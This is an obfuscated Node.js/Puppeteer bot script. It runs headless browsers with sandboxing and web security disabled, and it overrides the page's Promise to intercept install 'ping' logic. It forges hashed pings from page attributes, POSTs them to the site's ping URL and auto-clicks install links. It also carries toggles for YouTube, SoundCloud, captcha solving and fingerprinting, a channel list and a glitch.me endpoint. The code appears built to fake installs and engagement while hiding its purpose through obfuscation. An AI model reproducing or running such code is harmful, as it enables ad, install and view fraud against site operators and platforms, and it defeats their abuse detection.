y[-0x1525 + 0x1 * 0x8c3 + 0xc65 * 0x1 & N++]) : (L = -0x80b0 + -0x15 * -0x28c + 0x14b34 + ((-0x1fa9 + -0x12e0 + 0x3688 & L) << -0x2c + -0xf63 + -0x3 * -0x533 | -0x1 * -0x1ae4 + -0x22fe * -0x1 + -0x1 * 0x39e3 & J['charCodeAt'](++M)), P[N >> 0x266f * -0x1 + 0x9bb * -0x4 + 0xe9 * 0x55] |= (0x3 * -0xbcb + -0x26c9 + 0x4b1a * 0x1 | L >> 0x1 * 0x1c3 + 0x1ba9 + -0x1d5a) << y[-0x4 * -0x75 + 0x1 * 0x1903 + -0x1ad4 & N++], P[N >> -0xc * 0x2dd + 0x6 * -0x322 + 0x352a] |= (0x1b71 * 0x1 + -0x12c9 + -0x828 | L >> -0x22eb * -0x1 + 0x125 * 0xe + 0x1 * -0x32e5 & -0x18d2 + -0x197 * 0x7 + 0x2432) << y[-0x95 * -0xb + 0x55 * 0x53 + -0x21f3 & N++], P[N >> -0x211c + 0x78d * -0x3 + -0x1 * -0x37c5] |= (-0xdd * -0xd + 0xae0 + -0x1599 | L >> -0x1979 + 0x750 + -0x7 * -0x299 & 0x1c0c + 0xd6 * -0xc + -0x11c5) << y[0x1812 + -0x49 * -0x10 + -0x1 * 0x1c9f & N++], P[N >> -0x1 * -0x19dd + -0x1f4e + 0x5d * 0xf] |= (0x3 * -0x7fc + -0x7d0 + 0x2044 | 0xd4f + 0x8 * 0x30b + -0x2568 & L) << y[-0x8 * 0x26f + 0x1a7a + 0x1 * -0x6ff & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0xfe4 + -0x1 * 0x355 + -0x3e5 * -0x5 ? (this['block'] = P[0x17f * 0x3 + -0x552 + 0xe5 * 0x1], this['start'] = N - (-0x3 * -0x43f + 0x2335 * -0x1 + 0x16b8), this['hash'](), this['hashed'] = -0x7fd * 0x3 + -0x4b0 + 0xe * 0x20c) : this['start'] = N;
                }
                return this['bytes'] > 0x4 * 0x15e783bd + 0x6a9dd694 + -0x1496b37d * -0x3 && (this['hBytes'] += this['bytes'] / (-0x4b49c3f4 + -0x1f9452db0 + 0x3448ef1a4) << -0x1c6e * -0x1 + 0x1ebf + -0x3b2d, this['bytes'] = this['bytes'] % (-0x2fa7c * 0x23c5 + -0x43b * 0x64eeb8 + 0x3158799d4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0xfb * -0x1b + 0xa88 + -0x2500;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x17c5 + 0x219 * 0x6 + 0x1 * -0x244b] = this['block'], J[K >> 0x1 * 0xef7 + 0xfd5 + -0x1eca] |= x[-0x15e8 + 0x23fc + 0xe11 * -0x1 & K], this['block'] = J[-0x502 + -0x989 + 0xe9b], K >= -0x25ef + 0xb0b * 0x1 + 0x1b1c && (this['hashed'] || this['hash'](), J[-0xcc0 + -0x1621 + 0x22e1] = this['block'], J[-0x1591 + 0xb5 + 0x14ec] = J[0x93e + -0x1 * 0x10f6 + 0x1 * 0x7b9] = J[0x20ef + -0x1f * -0x91 + -0x327c] = J[0x180f + -0x2 * 0xac9 + -0x27a] = J[0xb * -0xcf + 0x1ae1 + -0x398 * 0x5] = J[0x31 * 0x44 + 0x235b + 0x101e * -0x3] = J[-0x2 * 0x5ea + -0x5d7 * 0x5 + 0x290d] = J[-0x1 * 0x1c09 + 0x712 + -0xa7f * -0x2] = J[0x79 * -0x2c + 0x16d4 * 0x1 + -0x200] = J[0x14 * 0x10b + -0x19 * -0x71 + 0x1fdc * -0x1] = J[0xe * -0x26b + 0x1f8a + -0x56 * -0x7] = J[0x1c3d + 0x158e + 0x638 * -0x8] = J[-0x7 * 0xd4 + 0x1 * -0xfb9 + 0x1591 * 0x1] = J[-0x138a + -0x655 * -0x2 + 0x1 * 0x6ed] = J[-0x200c + 0x1a37 + -0xb * -0x89] = J[-0xe * 0x244 + -0x1387 + 0x334e] = -0x1a45 + -0x13 * -0x1d2 + -0x851), J[0x12 * -0x22a + -0xad1 + 0x1 * 0x31d3] = this['hBytes'] << -0x78 * 0x23 + 0x49 * -0x53 + -0x5ba * -0x7 | this['bytes'] >>> 0x2628 + -0x1cd4 + -0x937, J[-0x1 * -0xb35 + -0xdc5 + 0x29f] = this['bytes'] << 0x68c * 0x4 + -0x21b * -0x9 + -0x2d20, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x5 * -0x532 + -0x35 * -0x1 + -0x1a1f; J < -0x1675 + -0x1 * 0xb29 + -0x2 * -0x10f7; ++J)
                K = Q[J - (-0xcbc + -0x95c + 0x1 * 0x161b)] ^ Q[J - (0x228c + -0x1 * -0x4d6 + -0x275a)] ^ Q[J - (-0x1 * -0x18d + -0x959 + -0x6 * -0x14f)] ^ Q[J - (0xcf * -0x25 + -0x2028 + 0x3e23)], Q[J] = K << -0x1464 + 0x1146 + 0x11 * 0x2f | K >>> 0xe7e + -0x2 * 0x112c + 0x13f9;
              for (J = 0x72b * 0x2 + 0x23be + -0x3214; J < -0x6f6 + 0x21e2 * 0x1 + 0x4 * -0x6b6; J += -0x1c0 * 0x16 + -0xe09 * -0x1 + -0x187c * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x333 * 0x7 + 0x3d + -0x169d | L >>> -0x29 * -0x1d + 0x1c28 + 0x20b2 * -0x1) + (M & N | ~M & O) + P + (-0x3 * -0x10d53ed6 + 0x9cd16c2d + -0x20c9bc6 * 0x39) + Q[J] << 0x2f * 0x7d + 0x5d7 * 0x1 + -0x1cca) << 0x2592 + 0x641 * 0x5 + -0x44d2 | P >>> -0x13cd + -0x2 * 0x33b + 0x1a5e) + (L & (M = M << 0x5d8 + -0x1e8f * 0x1 + 0x18d5 | M >>> -0x2461 + -0x22fe + 0x4761) | ~L & N) + O + (-0x750a042 * 0x1 + 0x2aa18623 + 0x139fd98 * 0x2d) + Q[J + (-0x1 * 0x7ae + -0x1908 + 0x20b7)] << 0x47 * 0x64 + -0x22 * 0xe1 + -0x1 * -0x226) << 0x2 * 0x9a3 + 0x2 * 0x104f + -0x33df | O >>> -0x3a9 + 0x175f * -0x1 + -0x1b23 * -0x1) + (P & (L = L << 0x18e1 + 0xeec + -0x27af | L >>> -0x365 * -0x1 + 0x1 * -0x1b49 + 0x17e6) | ~P & M) + N + (0x3b * 0x15a7651 + 0x7133 * 0xbbd9 + -0x231aaad * 0x21) + Q[J + (0x1e28 + -0x1 * -0x226 + 0xc * -0x2b1)] << -0x6eb + 0x63b + 0xb0) << -0x21e1 * -0x1 + 0x1 * -0x1b37 + -0x6a5 | N >>> -0x38b + 0x1 * -0x1a3 + 0x549) + (O & (P = P << 0x16b8 + -0x1fac + 0x912 | P >>> -0x44 * 0x7d + 0x2 * 0xa03 + 0xd30) | ~O & L) + M + (-0x9c98e827 + 0x1 * -0x32da009b + -0x1 * -0x129f5625b) + Q[J + (0x2376 + 0x2 * -0x11e4 + 0x55)] << -0x1646 + 0x5 + -0x1 * -0x1641) << -0xa * -0x3e0 + -0x17d + -0x3 * 0xc6a | M >>> 0x903 * 0x3 + -0x5 * -0xca + -0x1ee0) + (N & (O = O << -0x100f * 0x1 + -0x1b93 + -0x2bc0 * -0x1 | O >>> -0x17a1 + -0x6 * -0x1f + -0x16e9 * -0x1) | ~N & P) + L + (0x6ace7d87 * 0x1 + -0x19e6ab9c + 0x99aa7ae) + Q[J + (-0x659 + -0x52a + 0xb87)] << 0x1451 + 0x4a1 + 0x2 * -0xc79, N = N << -0xcd2 + 0x133d + 0x64d * -0x1 | N >>> -0x29 * 0x46 + 0x99b * -0x2 + 0x616 * 0x5;
              for (; J < 0x920 * -0x2 + -0x1a7 * -0x5 + 0x31 * 0x35; J += 0x2259 + 0x243 * 0xc + -0x119 * 0x38)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xae7 * -0x2 + -0x23ad * -0x1 + -0xdda | L >>> 0x1b4e + -0x856 * 0x1 + -0x12dd) + (M ^ N ^ O) + P + (-0x4 * -0x36608d33 + -0x2d781443 + 0x624 * -0x9f6ea) + Q[J] << -0x109f * 0x2 + 0x2 * -0x10c9 + 0x2 * 0x2168) << 0x1c39 + -0x12cb * -0x1 + -0x2eff | P >>> -0x15ff + -0x2 * -0xa2b + -0xe2 * -0x2) + (L ^ (M = M << 0x4ab + 0xece + -0x135b * 0x1 | M >>> 0x8 * -0xd7 + 0x2082 + -0x19c8) ^ N) + O + (-0x40d1b * -0x459 + -0xcc46ff9a + -0x88 * -0x230076b) + Q[J + (-0x3e2 * 0x6 + 0xe35 + 0x918)] << -0x10d * -0xb + 0x224c + -0x27 * 0x12d) << 0x1b * 0x35 + 0xffa + -0xac6 * 0x2 | O >>> -0x1189 * -0x2 + 0x3a * 0x17 + -0xb * 0x3a7) + (P ^ (L = L << -0x216a + -0x2e * 0xd + -0x11ef * -0x2 | L >>> 0x2 * 0x46a + -0x1 * 0xf5b + 0x689) ^ M) + N + (-0xb * -0x122297e7 + -0x7841e47c + -0x1f9f4930 * -0x1) + Q[J + (-0x1d9 + 0x2 * -0xfce + 0x2177)] << -0x1cc3 + 0x215d + -0x49a) << -0x6d6 + -0x2 * -0x766 + 0x7f1 * -0x1 | N >>> -0x5 * 0x2f5 + 0x1 * 0x16a9 + 0xdd * -0x9) + (O ^ (P = P << -0xce4 + 0xcb * -0x16 + 0x1e74 | P >>> 0x3 * -0x742 + 0x1b71 + 0x45 * -0x15) ^ L) + M + (-0x79baf932 + -0xc2d * -0x3b0d2 + 0xbba4f7e9) + Q[J + (0x1ab7 + -0xfc7 * -0x1 + -0x2a7b)] << 0x370 + -0xdbd * 0x1 + 0xa4d) << 0x1cae + 0x2439 + -0x37 * 0x12e | M >>> -0xfc + 0x1f34 + -0x1e1d) + (N ^ (O = O << 0x4e8 + -0x14a8 + -0x1 * -0xfde | O >>> 0x1846 + 0x276 + 0x137 * -0x16) ^ P) + L + (-0xa3c3fc84 + -0x32be34a5 + -0x1d94029e * -0xb) + Q[J + (0x11f5 + -0x862 + -0x98f * 0x1)] << -0x1252 + -0x1407 + 0x2659, N = N << 0x1e8f + -0x1 * -0x38f + -0x2200 | N >>> -0x2496 + -0x11d7 + 0x366f;
              for (; J < -0x2b + -0x1eeb * -0x1 + 0x1e84 * -0x1; J += 0x1 * -0x2375 + 0x1dec + -0x12 * -0x4f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x7 * -0x3f5 + -0x39 * -0x67 + 0x3 * -0x10df | L >>> -0x485 + 0x780 + -0x2e0) + (M & N | M & O | N & O) + P - (0xce1c7780 + 0x54b5df5b * -0x1 + -0x8825501) + Q[J] << -0x1 * -0x147b + 0x8fd + 0x2e * -0xa4) << -0x362 * -0x7 + 0x6 * 0x39e + 0x7 * -0x67b | P >>> 0x12c9 + 0x1d04 + 0x17d9 * -0x2) + (L & (M = M << 0x239f * -0x1 + 0x153 * -0x6 + 0x2baf | M >>> 0x1c0d + 0x10d * -0x4 + 0x1 * -0x17d7) | L & N | M & N) + O - (-0x6fed62f2 + -0x8bdc727b + 0x26ba9 * 0x96a9) + Q[J + (0x1cb7 + -0x2213 * 0x1 + 0x55d)] << -0x1 * 0x108d + 0x26e7 + -0x165a) << 0x24af + -0x7cd + -0x1cdd | O >>> 0x5 * 0x27d + -0x656 * -0x2 + 0x856 * -0x3) + (P & (L = L << -0x13b + 0xd8d + -0xc34 | L >>> -0x15f + -0x2de + 0x1 * 0x43f) | P & M | L & M) + N - (-0x81aad85c + 0x54d59 * 0xbd + 0xeea500cb) + Q[J + (-0x216b + 0xb * 0x27 + -0x1 * -0x1fc0)] << 0x14 * 0xc7 + 0x521 + -0x14ad) << 0x2282 + -0xd8e + -0x1 * 0x14ef | N >>> 0x1 * 0x6a2 + -0xb * 0xd1 + 0x274) + (O & (P = P << -0x1 * -0xcfb + 0x1 * 0x698 + -0x1375 | P >>> -0x201b * -0x1 + 0x92 * 0xf + 0xd8d * -0x3) | O & L | P & L) + M - (0x67ab0 * 0x1bb9 + -0x673ce7af + -0x9d * -0x3b873f) + Q[J + (0xcd9 + 0x1008 * 0x2 + 0x7 * -0x66a)] << 0xb8 * 0x1f + 0x10e4 + -0x272c) << -0x2610 + -0x49 * -0x15 + 0x2018 | M >>> 0x43 * -0x1 + 0x7 * 0x4d5 + -0x2175) + (N & (O = O << -0x1 * -0x2401 + -0x14e4 + 0x1 * -0xeff | O >>> -0x38d + -0x19 * -0x4f + 0x38 * -0x13) | N & P | O & P) + L - (0xba51cd80 + -0x3055de3 * -0x2e + 0x99a * -0x161edf) + Q[J + (-0x693 + 0x6 * -0x2e1 + 0x17dd)] << -0x26b * 0xa + -0x2 * 0x12ad + 0x3d88, N = N << 0x2 * 0x944 + 0x1524 + -0x2 * 0x13c7 | N >>> -0x3f1 * -0x3 + 0x10a6 + -0x1c77;
              for (; J < -0x1b93 + -0xc6f + 0xd * 0x31a; J += -0x1d * -0x13c + 0xb6 * -0x2b + 0x1 * -0x535)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x850 + -0x1901 + -0x3 * -0x592 | L >>> -0xfa9 * -0x2 + 0x26ea + 0x565 * -0xd) + (M ^ N ^ O) + P - (-0x6129b3ef + -0x7 * -0x14a9627 + 0x8dbcd708) + Q[J] << 0x874 + 0x1 * 0xddc + -0x1650) << 0x80 * -0x1a + 0x1 * 0xf3e + -0x239 | P >>> 0x113e + 0x8 * 0x161 + -0x1c2b) + (L ^ (M = M << -0x2 * 0x6a + 0x47f * 0x3 + 0xa9 * -0x13 | M >>> 0x1981 + 0x22ab + -0x3c2a) ^ N) + O - (-0x3 * 0x4218ead + 0x323629a3 + -0x1ac7a2 * -0x97) + Q[J + (-0xdb * 0x13 + 0xf0 + 0xf52)] << 0x2 * -0x5bf + 0x2601 + -0x1a83) << 0x70 * -0xe + 0x25d8 + -0xa91 * 0x3 | O >>> -0x1 * 0x869 + 0x8b8 + -0x34) + (P ^ (L = L << 0xbe7 * -0x1 + 0xc * 0x41 + -0x1 * -0x8f9 | L >>> 0x2145 + -0x350 * -0x7 + 0x3 * -0x12d1) ^ M) + N - (-0x3fe56 * -0x67a + 0x2 * -0x6c16afa + 0x2942db22) + Q[J + (-0xde3 + -0x16b5 + 0x249a)] << -0x127 + -0xd6 * -0x1 + 0x3 * 0x1b) << 0x236 * -0x2 + -0xcb * 0x15 + 0x1518 | N >>> 0x22a2 + 0x4 * -0x143 + 0x1 * -0x1d7b) + (O ^ (P = P << 0xd16 * 0x1 + -0x1a24 + 0xd2c | P >>> 0x1 * -0x223f + -0x1 * -0xf6a + -0x1 * -0x12d7) ^ L) + M - (-0x4208d68e + 0x21137b67 + 0x56929951) + Q[J + (-0x119e + 0x425 + -0x6be * -0x2)] << 0x5 * 0x39d + -0x11fa + -0x17) << 0x9d3 * -0x3 + -0x1b6d + -0x38eb * -0x1 | M >>> -0x1 * 0x923 + 0x75e + 0x1e0) + (N ^ (O = O << -0xa6 + 0x7af + -0x6eb | O >>> -0x21a7 + 0x1171 + 0x1038) ^ P) + L - (-0x16d1a96b + 0xfa42706 + 0x3ccac08f) + Q[J + (0xa7f + -0x1a6a + 0x1 * 0xfef)] << 0x1e36 + -0x1d4f + -0x21 * 0x7, N = N << 0x1 * -0x104f + 0x41f + 0x5 * 0x276 | N >>> -0x24f7 + 0x9 * 0x7e + 0x1 * 0x208b;
              this['h0'] = this['h0'] + L << -0x1345 * -0x2 + 0x1 * -0x74b + -0x1f3f * 0x1, this['h1'] = this['h1'] + M << 0x10e0 + 0x127b + -0x235b, this['h2'] = this['h2'] + N << -0x1 * -0x31 + 0x891 * 0x3 + -0x19e4, this['h3'] = this['h3'] + O << -0x2a2 * 0x7 + -0x178 * -0x2 + 0xf7e, this['h4'] = this['h4'] + P << -0x186d + -0x5db * -0x3 + 0x6dc;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1 * -0x305 + -0x34 * 0x75 + -0x55 * -0x51 & 0x320 + 0x719 * -0x1 + 0x408] + w[J >> 0x357 + 0x1490 + -0x17cf & -0x1d * 0x32 + -0x1895 + 0x1e4e] + w[J >> -0x874 + -0x1f24 + -0x2 * -0x13d6 & 0x22 + -0xe4f + 0xe3c] + w[J >> -0x1 * 0x1964 + 0xa3d * 0x1 + 0x5 * 0x30b & -0x242 + -0x25e5 + 0x2836] + w[J >> 0x2515 + -0xdb1 + -0x2eb * 0x8 & 0x25e7 + 0x2457 + -0x4a2f] + w[J >> 0x55c * 0x2 + 0x8d * -0x2e + 0x753 * 0x2 & 0x23a + -0x1e25 + 0x1bfa] + w[J >> -0x9d0 + -0x11 * -0x1f7 + -0x1793 & -0x1fd + 0x2 * 0x4c7 + 0x1 * -0x782] + w[-0x8c * 0x43 + -0x16b7 + -0x9e7 * -0x6 & J] + w[K >> 0x97 * 0x3d + 0x19bf + -0x2 * 0x1ecf & 0x1d8a + -0x1dbb + 0x10 * 0x4] + w[K >> 0x3d2 + 0x1885 + -0x1c3f & -0x708 + 0x82b * 0x2 + -0x93f] + w[K >> -0x39 * 0x4f + -0x3ce * 0x1 + 0x1579 & 0x1908 + 0x17 * -0x43 + -0x12f4] + w[K >> -0x2 * -0x129c + 0x1fc4 + -0x44ec & -0x3b * -0x6d + 0x226a + -0x3b7a] + w[K >> -0x24b5 + -0x694 * -0x2 + 0x1799 & 0xaf1 * 0x1 + -0x1 * 0x351 + 0x1 * -0x791] + w[K >> -0x817 + -0xa3d + 0x2f * 0x64 & -0x633 * -0x1 + -0x5 * -0xc5 + -0x9fd] + w[K >> 0x1298 + -0x1 * 0x7c7 + -0xacd & 0x6f * -0x1 + 0x103 * -0x23 + 0x23e7 * 0x1] + w[0x6a1 * 0x2 + 0x1eb1 + 0x35 * -0xd4 & K] + w[L >> -0x1 * 0x85d + 0x1354 + 0xadb * -0x1 & -0xaf1 + -0xe4d + 0x194d] + w[L >> 0x15c6 * 0x1 + -0x172c + -0xbf * -0x2 & 0xcd9 + -0x2285 * 0x1 + 0x1 * 0x15bb] + w[L >> 0x13f * -0xf + 0x271 * 0x1 + -0xdc * -0x13 & -0x2 * -0xfd4 + -0x89e + -0x16fb] + w[L >> 0x1eb * -0x11 + -0x1116 + 0x31c1 & -0x2400 + 0x2b9 + 0x22 * 0xfb] + w[L >> 0x20b * -0x7 + 0xfe * 0x27 + -0x1 * 0x1859 & -0xccb + -0x1ae0 + 0x27ba] + w[L >> -0x23dd + -0x1244 * 0x2 + -0x1 * -0x486d & -0x22e5 + -0xf09 + 0xbf * 0x43] + w[L >> -0x7c * -0x3d + -0x6 * 0x2cf + -0xcae & 0x1ee3 + 0x1a88 + -0x395c] + w[0x1c20 + 0x1e45 + -0x1372 * 0x3 & L] + w[M >> 0x1c * 0xcd + 0x1f4d + -0x359d & 0x1f6e + -0x16e1 * 0x1 + -0x87e] + w[M >> -0xf2e * -0x1 + -0x1 * -0x1b5d + -0x2a73 & -0x1b94 + 0x1 * 0x263f + 0x54e * -0x2] + w[M >> -0x118d + -0x419 * 0x1 + 0x135 * 0x12 & -0x2 * -0x524 + 0x5 * 0x66b + -0x2a50] + w[M >> 0x3 * 0x6b9 + -0x2cd * 0x8 + -0x1 * -0x24d & -0x1c8b * 0x1 + -0x1 * -0x75d + -0x1 * -0x153d] + w[M >> -0xad * -0x6 + -0x1d * 0x1b + -0x1 * 0xf3 & -0x1a * 0xbb + -0x3 * 0x30a + -0x1c2b * -0x1] + w[M >> 0x1224 + 0x1 * -0x2533 + -0x1b * -0xb5 & 0x1 * -0x1b3b + 0xdf * -0x2b + -0x27 * -0x1a9] + w[M >> 0x12 * -0x3e + -0x2 * -0xf21 + -0x19e2 & -0x3 * 0x19b + -0x231f * 0x1 + 0x27ff] + w[-0x1136 * -0x1 + -0x24d7 * 0x1 + 0x13b0 & M] + w[N >> -0x4f8 + 0x1 * 0x17b9 + -0x12a5 & -0x247 * -0xd + -0x1ba7 + -0x1 * 0x1e5] + w[N >> -0x1 * 0x3bc + -0x2153 + 0x2527 * 0x1 & -0x1132 + 0x1442 * 0x1 + -0x301] + w[N >> -0x532 + 0x133 * 0x13 + -0x1 * 0x1183 & 0x505 * -0x2 + 0x14bf + -0xaa6] + w[N >> 0x3 * 0x5a5 + -0x1e9a * 0x1 + 0xdbb & 0x11ec + 0x9ac * -0x4 + 0x14d3] + w[N >> -0x32 * 0xbc + -0x5 * 0xc2 + 0x288e & -0x259b * -0x1 + 0x1fa0 + 0x2 * -0x2296] + w[N >> 0x8a * -0x1b + 0x7b * -0x1b + 0x1b8f & -0xfb1 * 0x1 + -0x5a6 * -0x5 + -0xf6 * 0xd] + w[N >> -0x2 * 0x1344 + -0x10b * -0x9 + -0x1d29 * -0x1 & 0xf18 + 0x2420 + 0x74f * -0x7] + w[0x1c32 + 0x1511 + 0x86 * -0x5e & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xc3a + 0x49a * -0x1 + -0x4c * -0x39 & 0x1294 + -0x3 * 0x20c + -0xb71,
                J >> 0x12e6 + -0x1 * 0xeb1 + 0x1 * -0x425 & 0x1 * 0x79d + 0x17e2 + 0x2 * -0xf40,
                J >> 0xadb + -0x14 + 0xabf * -0x1 & -0x1407 + -0x1089 + 0x783 * 0x5,
                -0xa36 * 0x1 + 0x1 * -0x2285 + 0x2dba & J,
                K >> -0x7 * -0xbf + 0x24f9 + -0x2a1a & 0x12f4 * 0x1 + 0x101 * 0x8 + -0x19fd * 0x1,
                K >> -0xda4 + 0x1464 + 0x358 * -0x2 & 0x1c0 + -0x221 + -0x16 * -0x10,
                K >> -0x2 * -0x243 + -0xa21 + -0x27 * -0x25 & 0x242f * -0x1 + 0x95c + 0x1bd2,
                -0x1 * -0x17c5 + 0x2 * 0x4ed + -0x20a0 & K,
                L >> -0xc3a + -0x1fa4 + -0x15fb * -0x2 & -0x1 * 0xf47 + 0x20fa + -0x10b4,
                L >> 0x107 * 0xb + -0x1d0 * -0x13 + 0x2dad * -0x1 & 0x18f8 + 0x843 + -0x203c,
                L >> 0x2 * -0x2a7 + -0x800 + 0xd56 & 0x1cd3 + -0x1651 + -0x583,
                -0x2438 + -0x1b74 + 0x1d9 * 0x23 & L,
                M >> 0x4a * -0x18 + -0x33d * -0x3 + -0x1 * 0x2af & -0x1fe4 + 0x5bd + -0x32 * -0x8b,
                M >> 0x1fd0 + 0x93b * -0x3 + -0x40f & 0x2 * 0x7f7 + 0x1e2 + -0x10d1,
                M >> -0xeea + -0x99e * 0x4 + -0x102 * -0x35 & 0x10cd + 0x192a + 0x28f8 * -0x1,
                -0x971 * -0x3 + 0x18d1 + -0x3425 & M,
                N >> -0x3 * 0x111 + 0x1fe0 + -0x1c95 & -0x24da + -0x1c8b * 0x1 + -0x4be * -0xe,
                N >> -0x1375 + -0x6 * -0x626 + -0x115f & 0x1870 + 0x17 * -0x1d + -0x7 * 0x2fa,
                N >> 0x197d + 0xdb * -0x22 + -0x3a1 * -0x1 & -0x1 * 0xcb9 + -0x185d + 0x2615 * 0x1,
                0x94 * 0x7 + -0xdb7 + 0x1e * 0x5b & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x8e * 0x2f + -0x526 + -0x2 * -0xfa6), (K = new DataView(J))['setUint32'](-0x11e6 + -0x21c1 * -0x1 + 0x3 * -0x549, this['h0']), K['setUint32'](0x4fe + -0x342 * -0x2 + -0xb7e, this['h1']), K['setUint32'](-0x62 * -0x35 + -0x7 * -0x2bd + -0x276d, this['h2']), K['setUint32'](0x1f6c + -0x203 * -0x13 + -0x4599, this['h3']), K['setUint32'](-0xe63 + -0x1 * -0x287 + -0x2 * -0x5f6, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x415 + 0x1 * -0x20ad + 0x1c98];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1d0 + 0x3 * 0x87 + -0x365 * 0x1;
            J[0x41c * 0x7 + -0xf79 * -0x1 + 0x1c5 * -0x19]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1 * -0x1725 + -0x2a1 * 0xe + 0xda9 * 0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x197a + 0x1464 + 0x517), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x8e0 + -0x761 + 0x821 * 0x2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x117 * 0x4 + 0x4aa + -0x32a), Promise['resolve'](0xc0a + 0x1e86 * -0x1 + -0x127d * -0x1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x66b * -0x1 + 0x14 * -0x9f + -0x601 * -0x1; j < 0xb7 + 0x2 * -0xd1f + 0x1988; j++)
    i();
}
const NETWORK_PATIENCE = -0x28e * -0xa + -0x629 * 0x2 + 0x6 * 0x301 + (-0x16b3 + -0x1a7f + -0x45 * -0xe2) * Math['random'](),
  MM_NETWORK_PATIENCE = (0xd * -0x45 + -0x223e + 0x25c2) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1b13 + -0x1091 * -0x1 + -0x2ba4; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const W = b;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j[W(0x1e, 'KtUr')](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
